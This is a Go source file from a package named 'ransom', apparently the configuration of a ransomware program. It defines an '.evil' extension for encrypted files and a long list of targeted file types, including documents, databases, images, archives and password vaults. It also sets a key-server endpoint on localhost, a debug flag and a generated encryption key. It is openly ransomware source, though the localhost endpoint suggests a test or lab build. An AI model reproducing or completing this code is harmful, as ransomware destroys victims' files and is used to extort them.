package ransom

const extension = ".evil"

const maxFileSize = 1024 * 1024 * 1024 * 1024

var extensions = []string{
	".txt", ".py", ".hc", ".mp4", ".7z", ".flp", ".mkv", ".flac", ".flv", ".dat", ".kdbx", ".aep", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".odp", ".ods", ".odt", ".ppt", ".pptx", ".raw", ".jpg", ".jpeg", ".png", ".csv", ".py", ".sql", ".mdb", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".c", ".cs", ".mp3", ".mp4", ".f3d", ".dwg", ".cpp", ".zip", ".rar", ".mov", ".rtf", ".bmp", ".mkv", ".avi", ".iso", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".uue", ".xz", ".z", ".001", ".mpeg", ".mp3", ".mpg", ".db",
}

const Debug = true

const endpoint = "127.0.0.1:6031/ransomware"

const charset = "abcdefghijklmnopqrstuvwyxzABCDEFGHIJKLMNOPQRSTUVWYXZ0123456789!@#$%^&*()_-+={}[]:\";'\\<>,.?/`~"

var Key = GenerateKey()
